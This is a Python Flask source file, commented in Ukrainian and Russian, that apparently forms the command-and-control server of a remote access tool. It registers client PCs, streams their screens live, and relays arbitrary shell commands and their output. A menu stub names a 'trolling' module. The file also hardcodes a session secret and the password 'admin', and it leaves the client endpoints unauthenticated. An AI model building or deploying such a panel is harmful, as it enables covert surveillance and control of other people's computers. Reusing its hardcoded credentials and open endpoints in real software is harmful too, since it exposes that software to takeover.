import time
import threading
from flask import Flask, render_template_string, request, Response, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "super_secret_cyber_key"  # Ключ для сесій
PASSWORD = "admin"  # Пароль для входу в панель

# Словник для зберігання даних усіх ПК та Thread Lock для безпечної роботи з Gunicorn
clients = {}
clients_lock = threading.Lock()

# ================= HTML ШАБЛОНЫ (Неоновый дизайн) =================

CSS_BASE = """
<style>
    :root { 
        --neon: #00ffd0; 
        --bg: #05060d; 
        --panel: rgba(0,0,0,.35); 
        --border: rgba(255,255,255,.08); 
    }
    * { box-sizing: border-box; }
    body { 
        margin: 0; 
        background: var(--bg); 
        color: var(--neon); 
        font-family: 'Inter', 'Segoe UI', Arial, sans-serif; 
    }
    a { text-decoration: none; color: var(--neon); }
    
    .sidebar {
        position: fixed; top: 0; left: 0;
        width: 260px; height: 100vh;
        background: rgba(0,0,0,.92);
        border-right: 1px solid var(--border);
        padding: 20px 16px;
        z-index: 100;
    }
    .sidebar h2 { margin-top: 0; text-align: center; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px var(--neon); }
    .nav a {
        display: block; padding: 12px; margin-bottom: 10px;
        border-radius: 8px; border: 1px solid var(--border);
        transition: 0.3s;
    }
    .nav a:hover, .nav a.active {
        background: rgba(0, 255, 208, 0.1);
        border-color: var(--neon);
        box-shadow: 0 0 10px rgba(0, 255, 208, 0.2);
    }

    .main-content {
        margin-left: 260px;
        padding: 30px;
        min-height: 100vh;
    }
    
    .card {
        background: var(--panel);
        border: 1px solid var(--border);
        border-radius: 10px;
        padding: 20px;
        margin-bottom: 20px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
    }
    
    input[type="text"], input[type="password"] {
        width: 100%; padding: 12px; margin: 10px 0;
        background: #071018; border: 1px solid var(--neon);
        color: var(--neon); border-radius: 6px; outline: none;
    }
    button {
        width: 100%; padding: 12px; border-radius: 6px;
        border: 1px solid var(--neon); background: #001a1a;
        color: var(--neon); cursor: pointer; font-weight: bold;
        transition: 0.3s;
    }
    button:hover {
        background: var(--neon); color: #000;
        box-shadow: 0 0 15px var(--neon);
    }
    textarea {
        width: 100%; height: 300px; background: #000;
        color: var(--neon); border: 1px solid var(--border);
        border-radius: 6px; padding: 12px; font-family: monospace;
        resize: none; outline: none; margin-top: 10px;
    }
</style>
"""

LOGIN_HTML = CSS_BASE + """
<style>
    body { display: flex; align-items: center; justify-content: center; height: 100vh; }
    .box { background: #0b0b12; padding: 40px; border-radius: 12px; box-shadow: 0 0 40px var(--neon); width: 400px; text-align: center; }
    .title { font-size: 24px; font-weight: 700; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); }
    .msg { color: #ff4d4d; margin-bottom: 15px; font-weight: bold; }
</style>
<div class="box">
    <div class="title">Neon Remote Access</div>
    {% if error %}<div class="msg">{{ error }}</div>{% endif %}
    <form method="POST">
        <input type="password" name="password" placeholder="Введіть пароль адміна..." required>
        <button type="submit" style="margin-top: 15px;">УВІЙТИ</button>
    </form>
</div>
"""

SIDEBAR_HTML = """
<div class="sidebar">
    <h2>Neon Control</h2>
    <div class="nav">
        <a href="/dashboard" class="active">🖥️ Дашборд (ПК)</a>
        <a href="#" onclick="alert('Модуль файлового менеджера не подключен.'); return false;">📁 Файли</a>
        <a href="#" onclick="alert('Модуль диспетчера задач не подключен.'); return false;">⚙️ Процеси</a>
        <a href="#" onclick="alert('Модуль троллінгу не подключен.'); return false;">🤡 Тролінг</a>
        <a href="/logout" style="margin-top: 50px; border-color: #ff4d4d; color: #ff4d4d;">🚪 Вихід</a>
    </div>
</div>
"""

DASHBOARD_HTML = CSS_BASE + SIDEBAR_HTML + """
<style>
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
    .status { display: inline-block; width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; }
    .online { background: #00ffd0; box-shadow: 0 0 10px #00ffd0; }
    .offline { background: #ff4d4d; box-shadow: 0 0 10px #ff4d4d; }
    .btn-connect { display: block; text-align: center; border: 1px solid var(--neon); color: var(--neon); padding: 10px; border-radius: 6px; margin-top: 15px; transition: 0.3s; }
    .btn-connect:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
</style>
<div class="main-content">
    <h1 style="border-bottom: 1px solid var(--border); padding-bottom: 15px; margin-top: 0;">Підключені пристрої</h1>
    <div class="grid">
        {% for pc in pcs %}
        <div class="card">
            <h3 style="margin-top: 0; color: #fff;">💻 {{ pc.name }}</h3>
            <p style="color: #aaa; font-size: 14px;">IP: {{ pc.ip }}</p>
            <p>
                <span class="status {% if pc.online %}online{% else %}offline{% endif %}"></span>
                {% if pc.online %}В мережі{% else %}Не в мережі{% endif %}
            </p>
            {% if pc.online %}
                <a href="/view/{{ pc.id }}" class="btn-connect">⚡ Підключитися</a>
            {% else %}
                <span class="btn-connect" style="opacity: 0.3; border-color: #555; color: #555; pointer-events: none;">Недоступний</span>
            {% endif %}
        </div>
        {% else %}
        <p style="color: #aaa; font-style: italic;">Очікування підключення клієнтів...</p>
        {% endfor %}
    </div>
</div>
"""

CONTROL_HTML = CSS_BASE + SIDEBAR_HTML + """
<style>
    .control-grid { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
    @media (max-width: 1100px) { .control-grid { grid-template-columns: 1fr; } }
    .video-container img { width: 100%; border-radius: 8px; border: 1px solid var(--neon); box-shadow: 0 0 15px rgba(0, 255, 208, 0.2); }
</style>
<div class="main-content">
    <h2 style="margin-top: 0; border-bottom: 1px solid var(--border); padding-bottom: 10px;">
        Термінал управління: <span style="color: #fff;">{{ pc_name }}</span>
        <a href="/dashboard" style="float: right; font-size: 14px; border: 1px solid var(--border); padding: 5px 10px; border-radius: 5px;">Повернутися</a>
    </h2>
    
    <div class="control-grid">
        <div class="card video-container">
            <h3 style="margin-top: 0;">📺 Трансляція екрану</h3>
            <img src="/video_feed/{{ cid }}" alt="Очікування трансляції...">
            <p style="color: #aaa; font-size: 12px; margin-top: 10px; text-align: center;">Трансляція активна лише під час перегляду цієї сторінки.</p>
        </div>
        
        <div class="card cmd-container">
            <h3 style="margin-top: 0;">⌨️️ CMD (Командний рядок)</h3>
            <form onsubmit="sendCommand(event)">
                <input type="text" id="cmdInput" placeholder="Команда (dir, whoami, ipconfig...)" required autocomplete="off">
                <button type="submit">Виконати команду</button>
            </form>
            <textarea id="output" readonly placeholder="Тут буде виведено результат виконання команд...">{{ output }}</textarea>
        </div>
    </div>
</div>

<script>
    function sendCommand(e) {
        e.preventDefault();
        const cmd = document.getElementById('cmdInput').value;
        
        fetch('/api/send_cmd/{{ cid }}', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'command=' + encodeURIComponent(cmd)
        });
        
        document.getElementById('cmdInput').value = '';
        document.getElementById('output').value = '⏳ Виконується...';
    }

    setInterval(() => {
        fetch('/api/get_output/{{ cid }}')
            .then(r => r.text())
            .then(txt => { 
                if(txt) {
                    const outbox = document.getElementById('output');
                    if (outbox.value !== txt) {
                        outbox.value = txt; 
                        outbox.scrollTop = outbox.scrollHeight;
                    }
                }
            });
    }, 1500);
</script>
"""

# ================= МАРШРУТИ WEB-ІНТЕРФЕЙСУ =================

@app.route("/", methods=["GET", "POST"])
def login():
    if session.get("logged_in"):
        return redirect(url_for("dashboard"))
    
    error = None
    if request.method == "POST":
        if request.form.get("password") == PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        else:
            error = "Невірний пароль!"
    return render_template_string(LOGIN_HTML, error=error)

@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("login"))

@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    now = time.time()
    pc_list = []
    
    with clients_lock:
        items = list(clients.items())
        
    for cid, data in items:
        is_online = (now - data.get("last_seen", 0)) < 15
        pc_list.append({
            "id": cid,
            "name": data.get("name", "Unknown"),
            "ip": data.get("ip", "0.0.0.0"),
            "online": is_online
        })
    return render_template_string(DASHBOARD_HTML, pcs=pc_list)

@app.route("/view/<cid>")
def view_pc(cid):
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    with clients_lock:
        if cid not in clients:
            return redirect(url_for("dashboard"))
        pc_name = clients[cid]["name"]
        output = clients[cid]["output"]
        
    return render_template_string(CONTROL_HTML, cid=cid, pc_name=pc_name, output=output)

@app.route("/video_feed/<cid>")
def video_feed(cid):
    def generate():
        while True:
            frame = None
            with clients_lock:
                if cid in clients:
                    clients[cid]["last_viewed"] = time.time()
                    frame = clients[cid]["frame"]
            
            if frame:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            time.sleep(0.05)
            
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

# ================= API ДЛЯ WEB-ПАНЕЛІ =================

@app.route("/api/send_cmd/<cid>", methods=["POST"])
def send_cmd(cid):
    if not session.get("logged_in"):
        return "Unauthorized", 401
    
    with clients_lock:
        if cid in clients:
            clients[cid]["cmd"] = request.form.get("command", "")
            return "OK", 200
    return "Not Found", 404

@app.route("/api/get_output/<cid>")
def get_output(cid):
    if not session.get("logged_in"):
        return "", 401
    
    with clients_lock:
        if cid in clients:
            return clients[cid]["output"]
    return "", 404

# ================= API ДЛЯ КЛІЄНТІВ (ПК) =================

@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    data = request.json or {}
    cid = data.get("client_id")
    if not cid:
        return jsonify({"error": "No client_id"}), 400
    
    now = time.time()
    with clients_lock:
        if cid not in clients:
            clients[cid] = {
                "name": data.get("name", "Unknown PC"),
                "last_viewed": 0,
                "frame": None,
                "cmd": "",
                "output": ""
            }
        
        clients[cid]["last_seen"] = now
        clients[cid]["ip"] = request.remote_addr
        
        should_stream = (now - clients[cid]["last_viewed"]) < 3
        cmd_to_run = clients[cid]["cmd"]
        clients[cid]["cmd"] = ""
    
    return jsonify({"stream": should_stream, "cmd": cmd_to_run})

@app.route("/api/upload_frame/<cid>", methods=["POST"])
def upload_frame(cid):
    with clients_lock:
        if cid in clients:
            clients[cid]["frame"] = request.data
            clients[cid]["last_seen"] = time.time()
    return "OK", 200

@app.route("/api/post_output/<cid>", methods=["POST"])
def post_output(cid):
    with clients_lock:
        if cid in clients:
            clients[cid]["output"] = request.data.decode("utf-8", errors="ignore")
    return "OK", 200

if __name__ == "__main__":
    # Локальний запуск для тестування (якщо запускати напряму через python app.py)
    app.run(host="0.0.0.0", port=5000, threaded=True)
